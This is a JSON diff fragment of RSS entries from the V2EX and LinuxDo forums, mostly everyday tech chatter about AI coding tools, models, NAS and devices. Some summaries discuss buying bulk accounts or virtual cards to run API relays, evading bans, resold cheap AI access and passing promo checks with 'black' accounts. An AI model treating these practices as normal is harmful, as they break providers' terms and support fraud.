+      "summary": "Sam Altman 之前在一次 开发者交流 中提到自己只撑了 2 个小时就给了 Codex Full Access\n想了解下大家完全放手的比例大概是多少/有什么经验可以分享吗 :)"
+    },
+    {
+      "title": "[请教] 公司需清洗 TB 级文本数据，打算（采购/自建）AI 中转站，求教上下游经验",
+      "link": "https://www.v2ex.com/t/1199683#reply25",
+      "published": "2026-03-20T01:09:26Z",
+      "source": "V2EX - 技术",
+      "summary": "背景：\n大家好，\n最近接到一个业务需求，需要清洗数据湖里上 T 级别的文本数据。因为数据量极大，直接走官方直连 API 的成本非常高，而且并发限频也会是个瓶颈。\n目前我们正在评估两种方案：\n\n直接购买市面上的 API 中转服务\n自建中转站（代理池）\n\n因为涉及一定的数据安全和隐私问题，我们目前更倾向于在公司内部自建一个自动化的中转分发服务（比如基于 One API / New API 之类的开源网关来做二次开发或部署）。\n但在调研过程中发现这一块的水比较深，对于上下游的运作模式不太了解，所以想向 V 站做过类似业务的大佬们请教几个问题：\n1. 关于上游渠道：找卡商还是号商？\n如果要维持一个高并发的自建中转站，上游一般是去找“卡商”（买虚拟信用卡自己绑号开 API ）更稳定，还是找“号商”（直接批量采购带额度的成品号）更高效？哪种方式在维护成本和稳定性上更有优势？\n2. 关于大概的成本水位\n目前市面上靠谱的渠道，折算下来大致的成本行情是怎样的？（我们主要考虑跑轻量级但速度快的模型，比如 GPT-4o-mini 或 Claude-3-Haiku ）。\n3. 关于风控与封号处理\n这种大并发的"
+    },
+    {
+      "title": "想在 NAS 上囤积番剧和电影，大伙用的是什么方案？",
+      "link": "https://www.v2ex.com/t/1199703#reply70",
+      "published": "2026-03-20T01:48:31Z",
+      "source": "V2EX - 技术",
+      "summary": "我想将我喜欢的番剧和电影批量下载到 NAS 上，以方便用手机和平板随时观看，大伙有什么方案？\n基于 BT 的下载？还是用脚本从在线观看网站上用 yt-dlp 等工具按集数批量拉取 m3u8 ？\n清晰度新番 720p ，老番 480p 即可。"
+    },
+    {
+      "title": "有无 AWS 阿里云国际渠道商",
+      "link": "https://www.v2ex.com/t/1199952#reply1",
+      "published": "2026-03-20T16:39:01Z",
+      "source": "V2EX - 技术",
+      "summary": "有无 AWS 阿里云国际渠道商  留个联系方式呗"
+    },
+    {
+      "title": "MCP 是不是已经死了？没人再提这个了",
+      "link": "https://www.v2ex.com/t/1199658#reply52",
+      "published": "2026-03-19T17:49:04Z",
+      "source": "V2EX - 技术",
+      "summary": "感觉 MCP 最大的问题是，它只是定义了工具，它并没有定义怎么去用这个工具，甚至组合用一些工具来解决问题。\n现在 skill 来彻底解决了这个问题，Skills 可以用很多种方式来调用外部的功能，可以直接编程，可以请求 Http 接口，可以请求 web socket 接口，可以请求 API ，可以调用软件，调用命令行，等等一切可以调用的方式，去解决问题。似乎 MCP 真的是没什么必要了。\n大家觉得嘞？"
+    },
+    {
+      "title": "请问下各位老哥国产 plan 订阅怎么选择",
+      "link": "https://www.v2ex.com/t/1199932#reply6",
+      "published": "2026-03-20T14:02:30Z",
+      "source": "V2EX - 技术",
+      "summary": "最近公司终于要开团队订阅了，由于规定只能选择国产公司，请问下各位 kimi glm minimax 这几家的 coding plan 如何选择？\n工作需求是文档和编写工作比较多，所以会比较看重 agent office 能力，典型的场景就是把一个 pdf 或者图片上的信息理解再转到 excel 里，然后出分析报告，也会有一定的代码需求，不过目前都比较轻度，基本上就是几个脚本之间协同。因为涉及到信息核查，对准确率要求会比较高。\n对国产几家的能力和优势还不太了解，好像 minimax 看评论是幻觉会比其他家高？有老哥清楚几家区别或者实际使用体验的话帮忙推荐下，感谢"
+    },
+    {
+      "title": "IP 地址真不是个东西，让手机定位权限形同虚设",
+      "link": "https://www.v2ex.com/t/1199976#reply9",
+      "published": "2026-03-21T02:14:53Z",
+      "source": "V2EX - 技术",
+      "summary": "手机 App 禁止定位，但是没鸟用，因为 App 根据 ip 地址直接知道你在哪里。。。除非你用 vpn 跳板。不知道 ipv6 地址是不是也能定位"
+    },
+    {
+      "title": "小米新出的 mimo-v2-pro，免费一周，大家咋看？",
+      "link": "https://www.v2ex.com/t/1199436#reply89",
+      "published": "2026-03-19T02:32:16Z",
+      "source": "V2EX - 技术",
+      "summary": "看着还行 https://platform.xiaomimimo.com"
+    },
+    {
+      "title": "关于 Chrome 使用垂直标签栏的几个疑问",
+      "link": "https://www.v2ex.com/t/1199511#reply20",
+      "published": "2026-03-19T06:00:35Z",
+      "source": "V2EX - 技术",
+      "summary": "之前一直在用 Arc ，但是实在受不了它明明没有大更新又一直提示更新的拧巴，所以用回了 Chrome ，并且也设置了垂直标签栏。不过几天用下来，有两个地方实在不习惯：\n\n如何彻底隐藏（而不是折叠）标签栏？就像 Arc 上的 Cmd+S 一样\n如何真正的 Pin 住某个 Tab ，现在的 Chrome 在浏览 Pinned 标签的时候依然依然会被关闭。"
+    },
+    {
+      "title": "关于廉价的 codex/claude 的花销",
+      "link": "https://www.v2ex.com/t/1199592#reply17",
+      "published": "2026-03-19T10:16:02Z",
+      "source": "V2EX - 技术",
+      "summary": "浅浅体验：codex 渠道是咸鱼 team 拼车claude 渠道是淘宝 cursor 续杯一个小问题，codex 花销是几分 rmb ，claude 是几毛 rmb大概 1：10 （非常粗略的估算）都是在 vsc 里用的（ cursor 续杯这个渠道可以 cursor 里用 opus ，按对话次数的话约合也是几分，比 team 拼车更廉价，不过体验不如 vsc 的 claude 插件好）"
+    },
+    {
+      "title": "体感 GPT5.4 比 Claude Opus 4.6 更强一点",
+      "link": "https://www.v2ex.com/t/1199723#reply18",
+      "published": "2026-03-20T02:40:13Z",
+      "source": "V2EX - 技术",
+      "summary": "Claude Opus 4.6 是用的 cursor 的 Opus 4.6 MAX(思考),GPT5.4 是用的 codex(最高推理度),同样针对一些需求写计划,claude 写的计划总是能被 GPT 找到问题,而且确实存在。不过 GPT5.4 是后出的,比 Opus4.6 强情有可原...这几天打算先用 gpt 写计划了,claude 只负责把计划写成代码节约一点 codex 额度"
+    },
+    {
+      "title": "我的 TipTap 协同文档写了快一年，今天终于到 1.1k Star 了",
+      "link": "https://www.v2ex.com/t/1199817#reply2",
+      "published": "2026-03-20T06:40:20Z",
+      "source": "V2EX - 技术",
+      "summary": "DocFlow 写了一年，今天终于到 1.1k Star 了，对我来说确实是一个很开心的小里程碑。\n\n项目地址： https://github.com/xun082/DocFlow"
+    },
+    {
+      "title": "用完 20 刀的 opus 4.6 之后,发现自己啥也不会😭",
+      "link": "https://www.v2ex.com/t/1199818#reply22",
+      "published": "2026-03-20T06:41:19Z",
+      "source": "V2EX - 技术",
+      "summary": "cursor 现在的 500 次请求用的好快,不到 3 周我就用完了,不能用 opus4.6 之后,感觉工作效率大幅下降.现在只能用免费的 Composer 2 模型了.据说目前的 cursor 在处理任务的时候会开启 Subagents,导致请求次数比以前更不耐用了.万能的 V 友,还有什么推荐的 ai IDE 或者便宜好用的大模型吗?感觉要再开一个 ai 会员了.试过 antigravity,感觉同样是 opus4.6,没有 cursor 的聪明."
+    },
+    {
+      "title": "ai 编程的情况在你们使用什么 IDE",
+      "link": "https://www.v2ex.com/t/1200009#reply7",
+      "published": "2026-03-21T06:45:35Z",
+      "source": "V2EX - 技术",
+      "summary": "idea 太重了"
+    },
+    {
+      "title": "购买 Pixel 手机认证获取 1 年 gemini pro ... 没手机也可以搞",
+      "link": "https://www.v2ex.com/t/1199570#reply14",
+      "published": "2026-03-19T08:47:08Z",
+      "source": "V2EX - 技术",
+      "summary": "google 老号新号都可以 要求 google 账号地区为以下之一：\n美国 日本 新加坡 台湾 瑞士 澳大利亚  英国\n奥地利 比利时 加拿大 捷克 丹麦 爱沙尼亚 芬兰\n法国 德国 匈牙利 印度 爱尔兰 意大利 拉脱维亚\n立陶宛 马来西亚 墨西哥 荷兰 挪威 波兰 葡萄牙\n斯洛伐克 斯洛文尼亚 西班牙 瑞典 罗马尼亚\n\n可能有问题的地区\n日本 (google 官方解释可能是 6 个月没看明白自己研究下上面发那个 google 官方链接说明)\n\n用以前改 google 账号地区的方法确认你归属的地区\n据说，各种黑号，新注册号，都能认证（信息来自 claude 中转开源项目官方技术支持群的多个群友，真假自便，我用的自己大号没证实）\n具体活动官方说明：\nGOOGLE 官方活动说明\n\n账号有家庭组必须退出\n账号有家庭组必须退出\n账号有家庭组必须退出\n\n据说认证过了开完以后可以再开家庭组， 可以自己继续拼五个人\n有三方平台搞这个认证（平台收费与我无关） \n三方平台卖 15 块钱在线自助代过一个 gmail 或者邀请五个用户 或者签到 100 天\n想白嫖的 给你们探好推广邀请的路子了\n一个账号"
+    },
+    {
+      "title": "最强 CLI: OpenCLI 1.0.0 发布了，",
+      "link": "https://www.v2ex.com/t/1199918#reply4",
+      "published": "2026-03-20T12:12:34Z",
+      "source": "V2EX - 技术",
+      "summary": "opencli v0.8 → v1.0 更新总结 \nhttps://github.com/jackwener/opencli\n从 v0.8 到 v1.0 ，opencli 经历了一次脱胎换骨的进化，63 个 commit 带来了全方位升级。\n架构革命：告别 Playwright ，拥抱轻量级方案 这是最大的变化——彻底移除了 @playwright/mcp 依赖，用自研的轻量级 Daemon + Chrome Extension 方案替代。新架构支持 exponential backoff 重连、CDP screenshot 、extension console 日志转发，安装体验也从繁琐变成了 zero-step install 。这是 v1.0.0 的核心里程碑。\n平台爆发：从 Web 到桌面全面覆盖 新增了大量 adapter：小宇宙播客、Apple Podcasts 、网易云音乐、微信读书（ 7 commands ）、即梦 AI 、http://linux .do （ 6 commands ）、http://Grok. com 。桌面端更是井喷——通过 CDP 支持了 Chat"
+    },
+    {
+      "title": "[开源]保留你熟悉的 CLI，让 Claude Code、Gemini CLI 和 Codex 开箱即用",
+      "link": "https://www.v2ex.com/t/1199929#reply0",
+      "published": "2026-03-20T13:40:10Z",
+      "source": "V2EX - 技术",
+      "summary": "v1.0.20 版本已更新,助力大佬们 0 门槛使用 ai 工具如果好用,请点个小星星~\nhttps://github.com/doccker/cc-use-exp \nfeat: 新增 /optimize 命令、Codex 配置支持与多项优化\n\n新增 /optimize 系统优化命令，支持 full/ux/perf/code 四种模式\n新增 .codex/ 配置及 sync-config 同步逻辑（ sh + bat ）\nredis-safety 从 rules 下沉到 skills ，减少每次会话固定 token 消耗\njava-dev 新增 Native SQL 规范（ MySQL 保留字别名检测）\ngo-dev 性能优化表补充 SQL 保留字提示\nui-ux-pro-max 去掉 paths 自动触发，改为手动/描述触发\nplugins.json 清理 3 个低频插件，新增 code-review\ndefensive rule 新增上下文管理提示（/btw 、/compact ）\ncheck-toolsearch 修复版本显示（改用 claude --version ）\ngiti"
+    },
+    {
+      "title": "有做安卓 APP 的兄弟吗，个人 APP 加固，有什么比较靠谱的方案吗",
+      "link": "https://www.v2ex.com/t/1199809#reply13",
+      "published": "2026-03-20T06:24:30Z",
+      "source": "V2EX - 技术",
+      "summary": "兄弟们，个人 APP 加固，有什么比较靠谱的方案吗，免费 或者 轻付费的方案个人实在没能力支付高额的企业成本，大家都是怎么解决的"
+    },
+    {
+      "title": "Unraid 下 GVT-g 核显直通多虚拟机踩坑记录（飞牛 FNOS / DSM / Windows）",
+      "link": "https://www.v2ex.com/t/1199888#reply1",
+      "published": "2026-03-20T09:27:54Z",
+      "source": "V2EX - 技术",
+      "summary": "注意：由于本人文笔一般  以下信息本人通过 ai 进行润色整理最近在折腾 Unraid 虚拟化环境下使用 GVT-g 给多个虚拟机共享核显，整体目标是让不同系统（ Windows / FNOS ）都能调用 Intel 核显进行硬件加速。在实际过程中，DSM 和 Windows 基本“开箱即用”，但 FNOS 却踩了不少坑，这里做一个完整记录，给有类似需求的朋友一个参考。一、环境说明宿主系统：Unraid核显方案：Intel GVT-g虚拟机系统：DSM （群晖）WindowsFNOS二、问题现象在使用 GVT-g 插件分配核显时：DSM ✅ 正常Windows ✅ 正常FNOS ❌ 直接报错，无法进入系统三、问题分析 &amp; 解决过程这个问题并不是单一原因导致，而是多个因素叠加，我分阶段排查出来：1️⃣ FNOS 镜像版本问题（关键坑）我最开始使用的是：FNOS 0.8 早期版本 ISO结果：一旦分配 GVT-g 核显 → 直接无法启动后来测试发现：👉 问题本质：引导 + 内核版本过旧不仅 FNOS：Debian 老版本也存在同样问题✅ 解决方案：更换 最新版本 FNOS ISO "
+    },
+    {
+      "title": "想买国内 coding plan 的这会儿可以去看看百度千帆",
+      "link": "https://www.v2ex.com/t/1199831#reply23",
+      "published": "2026-03-20T07:05:18Z",
+      "source": "V2EX - 技术",
+      "summary": "各大厂家天天被抢完，百度今天这个点儿竟然还有货，点击付款后，发现我还有个不知道哪儿来的 20 元代金券，总共付了 20"
+    },
+    {
+      "title": "DDD 是不是已经死了？",
+      "link": "https://www.v2ex.com/t/1199700#reply56",
+      "published": "2026-03-20T01:44:21Z",
+      "source": "V2EX - 技术",
+      "summary": "最近在重构老项目，想问一下现在还有没有必要用 DDD 那套来重构呢？ go 语言加 DDD 配合 ai 变成会不会有意想不到的效果？"
+    },
+    {
+      "title": "Netcatty - 开源免费的 SSH 终端软件, 使用 AI 加速你的日常运维工作",
+      "link": "https://www.v2ex.com/t/1199762#reply57",
+      "published": "2026-03-20T03:31:31Z",
+      "source": "V2EX - 技术",
+      "summary": "前情提要\nhttps://www.v2ex.com/t/1195002\n摘要如下：\n\n之前我一直在付费用 Termius ，不过后来总觉得，每个月花 15 刀买一个 SSH Client ，还是有点贵。中间也调研过不少平替，但找来找去，除了 Termius 之外，确实没发现第二款支持云同步、同时体验也比较完整的 SSH Client 。于是就想着，干脆自己 vibe 一个出来。\n\n\nNetcatty 支持多种云同步方式，包括 Google Drive 、Github Gist 、OneDrive 、S3 、WebDav 。同步基本是实时的，只要配置发生变化，就会自动同步到云端。功能上，Netcatty 已经实现了 Termius 的大部分核心能力，交互和布局也参考了 Termius 。如果你本来就是 Termius 老用户，上手 Netcatty 应该会非常自然。\n\n\n不过，FIDO2 / 生物指纹密钥这部分我暂时还没有做；另外，Netcatty 目前也还不支持移动端。\n\n\n如果你刚好需要一个带云同步功能的 SSH Client ，同时也觉得 Termius 价格有点高，而且暂时没有移"
+    },
+    {
+      "title": "VSCode 使用 Cline（或者其它）对接 Vibe Coding 的 API，怎么做到隐私账号和代码隔离？",
+      "link": "https://www.v2ex.com/t/1199890#reply2",
+      "published": "2026-03-20T09:33:40Z",
+      "source": "V2EX - 技术",
+      "summary": "用的是中转 API ，要 Vibe 项目时，很多行为都要围绕一些 url ，公网 IP ，密钥来进行调试和编写的，这些资源给个低权受限的也干不了活，因为中转 API ，还是不想泄出去，大家是怎么做安全隔离的？"
+    },
+    {
+      "title": "开发了一个小工具， OpenClaw gateway 老挂？用这个 CLI 自动守活｜ v0.6.1",
+      "link": "https://www.v2ex.com/t/1199806#reply5",
+      "published": "2026-03-20T06:14:12Z",
+      "source": "V2EX - 技术",
+      "summary": "人在外面，和 OpenClaw 对话结果已挂，所以写了一个 watch dog 程序\n你是不是也遇到过：\n\nAI 正在跑任务，突然没响应\n回终端一看，gateway 早就挂了\n没告警、没重启，只能手动救火\n\n每次都敲 openclaw gateway restart，真的很烦。\n直接上工具：openclaw-cli\n一句话：让 OpenClaw 挂了就自动起，省心。\nnpm install -g openclaw-cli\n\n\n\nhttps://openclaw-cli.app/"
+    },
+    {
+      "title": "红米 15 5G 海外版无论如何都无法连接 Mac 传输文件。",
+      "link": "https://www.v2ex.com/t/1199885#reply2",
+      "published": "2026-03-20T09:15:37Z",
+      "source": "V2EX - 技术",
+      "summary": "人在海外长居，才入手红米 15 5G 海外版，可是连接我的 Macbook Pro M1 Max ，把手机端已经设置为”文件传输模式“，无论如何都无法用 OpenMTP 连接传输文件，Tahoe 完全无法识别手机，Mac AppStore 里的 Xiaomi Interconnectivity 无法连接系统为 Hyper OS 2 的红米 15 5G 。请问有好的有线传输的解决方案吗？谢谢。"
+    },
+    {
+      "title": "[理性讨论] 国产御三家的编程模型里面, 真正能咬住国外第一梯队的，也就 KIMI 和 GLM 吧",
+      "link": "https://www.v2ex.com/t/1199741#reply21",
+      "published": "2026-03-20T03:00:58Z",
+      "source": "V2EX - 技术",
+      "summary": "MiniMax 的每次发布都是拳打 GPT 最强模型，脚踢 Claude 最强模型，实际一坨。加上劈头盖脸的宣发，让人生厌。感觉单纯沦为拉伸股价的工具了。"
+    },
+    {
+      "title": "程序员都是铁公鸡?",
+      "link": "https://www.v2ex.com/t/1199474#reply105",
+      "published": "2026-03-19T03:41:08Z",
+      "source": "V2EX - 技术",
+      "summary": "昨天晚上在中关村参加了一个线下龙虾沙龙,有个嘉宾分享的时候说程序员都是铁公鸡,一毛不拔,舍不得花钱买 token 造,感觉被当众骂了,然后一想,难道说在坐的各位程序员也都是这样吗?\n我平时也会买 token,不过大多数都是上车队,找公益,找最便宜最稳定的第三方供应商,肯定不会直接上官网充高价会员.\n身边的朋友好像确实都是直接买会员,之前聊天他们还说一个月也就几十刀,我听着都觉得奢侈.我年入税后 50 多个,倒不是买不起会员,就是觉得真没啥性价比,大家也会这样吗?"
+    },
+    {
+      "title": "会不会出现一个工种叫skill工程师，负责给业务部门编写skill",
+      "link": "https://linux.do/t/topic/1795368",
+      "published": "Sun, 22 Mar 2026 00:58:42 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "最近负责给一个业务部门写skill，优化他们一个模式比较固定的对接开发流程。\n没有ai之前他们需要15天，他们自己写了个skill，不够系统，扔需要部分人工，减到3-5天\n花了三天写了套完整的，这几天不停的调skill编排和规范，思考如何解决规范缺失，上下文过长，注意力偏差等问题，现在完整跑一次需要一个多小时，完成度有90以上，研发可能需要2小时左右审查下就可以了\n后续会不会专门出现一个工种，skill工程师，他不需要对业务理解有多深，只要是要对ai的范式理解深刻就行，只需要有一个现有的范式和完成度比较高的成品做对比，通过反复实验，就能出一个完成度比较高的skill，来解放人力\n各位佬儿觉得呢？\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "gstatic 没法加载 icon",
+      "link": "https://linux.do/t/topic/1795366",
+      "published": "Sun, 22 Mar 2026 00:57:55 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "如题，gstatic 没法加载 icon，挂了全局才可以\n我也试过在 flclash 里面加代理规则，也不行\n有佬友遇到过吗\n            4 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "Leetcode每日一题 —— 1886. 判断矩阵经轮转后是否一致",
+      "link": "https://linux.do/t/topic/1795365",
+      "published": "Sun, 22 Mar 2026 00:57:16 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "力扣 LeetCode\n  \n\n  \n    \n\n1886. 判断矩阵经轮转后是否一致 - 力扣（LeetCode）\n\n  1886. 判断矩阵经轮转后是否一致 - 给你两个大小为 n x n 的二进制矩阵 mat 和 target 。现 以 90 度顺时针轮转 矩阵 mat 中的元素 若干次 ，如果能够使 mat 与&nbsp;target 一致，返回 true ；否则，返回 false 。\n\n&nbsp;\n\n示例 1：\n\n[https://assets.leetcode.com/uploads/2021/05/20/grid3.png]\n\n\n输入：mat = [[0,1],[1,0]], target =...\n\n\n  \n\n  \n    \n    \n  \n\n  \n\n\n思路\n简单题简单做，直接模拟即可。最多旋转4次就还原了，每旋转一次判断是否一致。\n应该可以一轮转四次，不过输入不大，没必要了。\n代码\nclass Solution {\n    public boolean findRotation(int[][] mat, int[][] target) {\n        int n"
+    },
+    {
+      "title": "做了一晚上梦",
+      "link": "https://linux.do/t/topic/1795364",
+      "published": "Sun, 22 Mar 2026 00:56:24 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "发现，梦里上厕所嘘嘘，醒来不会尿床\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "宝可梦飞机场能用surge吗",
+      "link": "https://linux.do/t/topic/1795362",
+      "published": "Sun, 22 Mar 2026 00:55:11 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "如同，我导入surge时显示错误\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "DigitalOcean可以搭🪜吗",
+      "link": "https://linux.do/t/topic/1795359",
+      "published": "Sun, 22 Mar 2026 00:53:11 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "各位大佬们，DigitalOcean的服务器能搭建吗，会封号吗\n            3 个帖子 - 3 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "耳机丢失案件",
+      "link": "https://linux.do/t/topic/1795355",
+      "published": "Sun, 22 Mar 2026 00:50:03 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "昨天晚上戴着耳机听歌睡觉\n今天早上起来耳机丢了一只\n在床上翻箱倒柜地\n怎么也找不到\n于是去询问 Gemini\n\n当即在 Bilibili 找到一个效果最好的视频\n  \n      \n\n      bilibili.com\n  \n\n  \n    \n\n外网警报音效_哔哩哔哩_bilibili\n\n  youtube, 视频播放量 20512、弹幕量 5、点赞数 251、投硬币枚数 15、收藏人数 545、转发人数 240, 视频作者 基金会F博士, 作者简介 你是一个一个一个，相关视频：警报 警告 危险 警备 戒备 音效 (HQ)，声呐探测音效.mp3，揭阳110报警电话接通前提示语，警告 警铃 危险 音效 (HQ)，警报素材（可忽视这条视频），巨石强森.mp3，各类警报声音，认真听完，关键时刻能救命。，WARNING！！！，空袭警报声，各种警报同时响起的声音\n\n\n  \n\n  \n    \n    \n  \n\n  \n\n\n将声音调到最大 在卧室里听\n果真奏效 听到了！\n又在床上翻箱倒柜地\n怎么也找不到\n后来我发现我走到哪里声音就跟到哪里\n心生疑惑 总不能在我身上吧？！\n试着蹦了几下\n果真 耳机掉了"
+    },
+    {
+      "title": "Epic本周免费游戏：电工模拟器 来学电工了",
+      "link": "https://linux.do/t/topic/1795346",
+      "published": "Sun, 22 Mar 2026 00:44:34 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "Epic本周免费游戏：电工模拟器\n玩了一小时，细节挺丰富，有一定的教育性，能了解到电路的基本构成，常见家用电器的拆解逻辑等等这些基础概念，从安装插座开始、然后修插头、吊灯，修理损坏的设备，以及铺设电线，挺好的科普向游戏，引导你学电工知识。\nps：实操需要配合专业教材或视频课程。\n领取地址 https://store.epicgames.com/zh-CN/p/electrician-simulator-164e9f\n            2 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "5.4 摩洛了吗",
+      "link": "https://linux.do/t/topic/1795335",
+      "published": "Sun, 22 Mar 2026 00:40:42 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "我不知道为什么，现在的xh/fast更多是在检讨和加强安全锁，又慢又漏又错，居然在靠cc擦屁股。莫非是多轮1M自动压缩的强制副作用吗\n变了变了\n虽然反过来多半也一样，但是起码响应及时没那么烦躁。还得加把劲啊cx \n            5 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "回忆贴！古早计算机入门光盘",
+      "link": "https://linux.do/t/topic/1795334",
+      "published": "Sun, 22 Mar 2026 00:40:27 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "4 个帖子 - 3 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "甲骨文不ABC体验！！！",
+      "link": "https://linux.do/t/topic/1795333",
+      "published": "Sun, 22 Mar 2026 00:40:18 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "早上坐公交，闲来无事搞了一发，但是我区域选的东京，应该没问题吧？\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "古早计算机入门！",
+      "link": "https://linux.do/t/topic/1795324",
+      "published": "Sun, 22 Mar 2026 00:38:39 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "（话题已被作者删除）\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "line(聊天app)開始收費",
+      "link": "https://linux.do/t/topic/1795322",
+      "published": "Sun, 22 Mar 2026 00:38:29 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "開始收費月費台幣165元\n刪除一些免費功能\n記事本跟相簿\n好像只剩下聊天功能免費而已而且還有廣告\n今年聊天app是開始收費的年份\ntg註冊好像開始收費\n微信qq好像沒有\n大家對收費怎麼看\n            7 个帖子 - 6 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "古早计算机入门",
+      "link": "https://linux.do/t/topic/1795321",
+      "published": "Sun, 22 Mar 2026 00:36:45 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "（话题已被作者删除）\n            1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "刚才让GROK写的一个小故事把我笑喷了",
+      "link": "https://linux.do/t/topic/1795309",
+      "published": "Sun, 22 Mar 2026 00:30:20 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "1 个帖子 - 1 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "佬们 问个问题123",
+      "link": "https://linux.do/t/topic/1795298",
+      "published": "Sun, 22 Mar 2026 00:23:35 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "请问一下 使用codex 或者 cc的时候 有些时候它们会问我是否确定操作 怎样让它们自动run呢 有啥方法吗 求助\n            5 个帖子 - 5 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "OpenAI 推出 Codex for Students：向美加大学生赠送$100编程积分",
+      "link": "https://linux.do/t/topic/1795289",
+      "published": "Sun, 22 Mar 2026 00:12:52 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "OpenAI 宣布面向美国和加拿大的大学生推出「Codex for Students」计划，为每位验证身份的学生提供$100Codex积分。\n-面向美国和加拿大在校大学生\n-每人获得$100 Codex积分\n-目标：支持学生通过「构建，拆解，修复」来学习编程\n-申请入口：chatgpt.com/codex/students\n            2 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "终于加入l站大家庭了",
+      "link": "https://linux.do/t/topic/1795287",
+      "published": "Sun, 22 Mar 2026 00:12:01 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "小菜鸡去年才知道l站，千辛万苦终于成功注册上了，可以不用偷偷看佬们聊天了。本人现在工作是做rpa自动化相关的，也是在在网上搜索相关内容发现的l站，虽然当时不能发言，不过也看到很多佬的帖子得到了启发，感恩各位佬的分享\n            24 个帖子 - 23 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "有没有低成本的智能音箱",
+      "link": "https://linux.do/t/topic/1795283",
+      "published": "Sun, 22 Mar 2026 00:08:54 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "佬们早上好，又是一个被斑鸠吵醒的早上！\n住顶楼经常有斑鸠五六点开始瓜瓜乱叫，刚好在窗户上面有打不到，还好声音大一点就会被惊走。每天晚上可能要赶J三四次，不胜其烦，睡眠质量严重下降。\n刚开始我想着搞个无人机把鸟赶走，但是后来仔细想想，无人机自动控制加上居民区起降是不是有很多难点和风险？所以苦恼好久.\n今天突然想到既然这鸟怕大声音，那么是不是搞个智能音箱，当识别到斑鸠的两种典型叫声超过多少分贝时自动播放赶鸟的声音呢？这样不用每次起来拍窗户，大佬有没有成熟点的，上手简单的方案，最好三五百以内的？\n            6 个帖子 - 4 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "感觉gpt每一秒都在封号",
+      "link": "https://linux.do/t/topic/1795272",
+      "published": "Sun, 22 Mar 2026 00:03:45 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "睡前注册的，早上起来已经封了一大半了，刷完牙洗完脸，又封几十个，这是奥特曼在压力测试封号？\n            7 个帖子 - 5 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "刚刚拿下第二个龟壳",
+      "link": "https://linux.do/t/topic/1795266",
+      "published": "Sun, 22 Mar 2026 00:01:42 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "区域坡西，感觉确实有点松了 \n            6 个帖子 - 5 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "国内购买的代理ip只能海外环境使用，必须买海外服务器吗？",
+      "link": "https://linux.do/t/topic/1795265",
+      "published": "Sun, 22 Mar 2026 00:01:15 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "我记得之前本级有梯子，指纹浏览器直接配置就好了，现在必须买海外服务器安装指纹浏览器才可以了吗？\n海外桌面环境太卡啦，没法用呀。\n            2 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "fcitx5 中文输入过程中出现随机插入-",
+      "link": "https://linux.do/t/topic/1795262",
+      "published": "Sat, 21 Mar 2026 23:59:53 +0000",
+      "source": "LinuxDo Latest",
+      "summary": "各位大佬，求指导\n目前使用thinkpad笔记本，通过omarchy脚手架框架，使用archlinux + hyprland。\n我使用 fcitx5 + rime 作为中文输入法来控制。但是发现问题：\n在我中文输入的过程中，可能就出现文本直接插入到文本输入框其他地方去了，然后光标定位在新的位置上。\n\n或者是断字的情况\n\n很懵\n            2 个帖子 - 2 位参与者\n            阅读完整话题"
+    },
+    {
+      "title": "真好记公益站 开放注册到周一 12.30",
+      "link": "https://linux.do/t/topic/1795254",
+      "published": "Sat, 21 Mar 2026 23:49:08 +0000",
+      "source": "LinuxDo Latest",
